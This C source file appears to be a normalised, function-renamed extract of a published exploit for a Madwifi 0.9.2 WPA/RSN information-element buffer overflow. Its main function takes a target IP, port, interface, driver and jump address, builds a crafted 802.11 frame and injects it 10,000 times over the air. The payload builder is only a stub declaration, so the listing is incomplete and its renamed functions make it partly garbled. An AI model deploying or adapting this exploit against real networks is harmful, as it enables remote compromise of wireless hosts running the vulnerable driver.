#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct tx80211_packet {unsigned char* packet; int /*<<< orphan*/  plen; } ;
struct tx80211 {char* ifname; } ;

/* Variables and functions */
 int /*<<< orphan*/  CHANNEL ; 
 int INJ_NODRIVER ; 
 int /*<<< orphan*/  TOTAL_PACKET_LEN ; 
 int TX80211_CAP_CTRL ; 
 unsigned char* FUNC0 () ; 
 char* driver ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ ,char*,...) ; 
 char* iface ; 
 char* ip ; 
 int jmp_address ; 
 int pad_space ; 
 int /*<<< orphan*/  FUNC3 (int,char**) ; 
 int /*<<< orphan*/  FUNC4 (char*) ; 
 int port ; 
 int /*<<< orphan*/  FUNC5 (unsigned char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC6 (char*,...) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  FUNC7 (struct tx80211*) ; 
 int FUNC8 (struct tx80211*) ; 
 scalar_t__ FUNC9 (struct tx80211*,char*,int) ; 
 scalar_t__ FUNC10 (struct tx80211*) ; 
 int FUNC11 (char*) ; 
 scalar_t__ FUNC12 (struct tx80211*,int /*<<< orphan*/ ) ; 
 scalar_t__ FUNC13 (struct tx80211*,struct tx80211_packet*) ; 
 int /*<<< orphan*/  FUNC14 (char*) ; 
 int /*<<< orphan*/  FUNC15 (int) ; 

int FUNC16(int argc, char *argv[])
{
  int i=0;
  struct tx80211 in_tx;
  struct tx80211_packet in_packet;
  int drivertype;
  
  FUNC3(argc, argv);                

  if(!iface || !driver || !ip || !port)
  {
    FUNC14(argv[0]);
    FUNC1(1);
  }

  FUNC6( "\n\nMadwifi 0.9.2 WPA/RSN IE buffer overflow\n\t exploit code: sgrakkyu <at> antifork.org\n"
          "-------------------- **** ------------------\n"
          "[opt-ip]: %s\n[opt-port]: %d\n[opt-iface]: %s\n[opt-driver]: %s\n[opt-jump]: 0x%08x\n[pad]: %d\n"
          "-------------------- **** ------------------\n\n",
          ip, port, iface, driver, jmp_address, pad_space);

  unsigned char *frame = FUNC0();
  FUNC5(frame, TOTAL_PACKET_LEN);

  /* Use the command-line argument as the desired driver type */
  drivertype = FUNC11(driver);

  /* Validate the driver name specified */
  if (drivertype == INJ_NODRIVER) 
  {
    FUNC2(stderr, "Driver name not recognized.\n");
    return -1;
  }

  if (FUNC9(&in_tx, iface, drivertype) < 0) {
    FUNC2(stderr, "Error initializing drive \"%s\".\n", argv[1]);
    return -1;
  }

  if ((FUNC8(&in_tx) & TX80211_CAP_CTRL) == 0) 
  {
    FUNC2(stderr, "Driver does not support transmitting control frames.\n");
    return -1;
  }

  if (FUNC12(&in_tx, CHANNEL) < 0) 
  {
    FUNC2(stderr, "Error setting channel.\n");
    return 1;
  }

  if (FUNC10(&in_tx) < 0) 
  {
    FUNC2(stderr, "Unable to open interface %s.\n", in_tx.ifname);
    return 1;
  }

  /* Initialized in_packet with packet contents and length of the packet */
  in_packet.packet = frame;
  in_packet.plen = TOTAL_PACKET_LEN;

  FUNC6("[sending packets]: about 10 a second\n");

  while(i < 10000)
  {
    /* Transmit the packet */
    if (FUNC13(&in_tx, &in_packet) < 0) 
    {
      FUNC2(stderr, "Unable to transmit packet.\n");
      FUNC4("txpacket");
      return 1;
    }
    i++;
    FUNC15(100000);
  }
  /* Close the socket after transmitting the packet */
  FUNC7(&in_tx);

  return 0;
}